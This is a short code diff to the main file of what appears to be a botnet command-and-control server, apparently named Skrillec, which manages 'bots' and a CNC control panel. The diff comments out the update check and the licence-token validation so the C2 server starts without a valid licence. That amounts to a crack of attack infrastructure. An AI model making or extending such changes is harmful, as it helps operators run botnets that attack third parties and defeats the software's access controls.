@@ -32,7 +32,7 @@ fn main() {
 		dbname: info[3]
 	}, current: &server.Current{}, notice: &utils.NotificationSys{}, bots: &server.Bots{}, parser: &utils.Parse{}}
 	// Update Check. Making sure this is the latest update or it will ask you to update the binary!
-	server.update_check()
+	// server.update_check()
 	
 	// Command Parsing 
 	mut cmd_args := os.args.clone()
@@ -82,10 +82,10 @@ fn main() {
 	}
 
 	// License token validation
-	if server.validate_token(mut &svr) == 0 {
-		println("[x] Invalid token")
-		exit(0)
-	}
+	// if server.validate_token(mut &svr) == 0 {
+		// println("[x] Invalid token")
+		// exit(0)
+	// }
 	// Start Server In a Thread (Background)
 	go server.start_skrillec(mut &svr)
 	// Start the CNC CP to control the CNC from server/VPS!
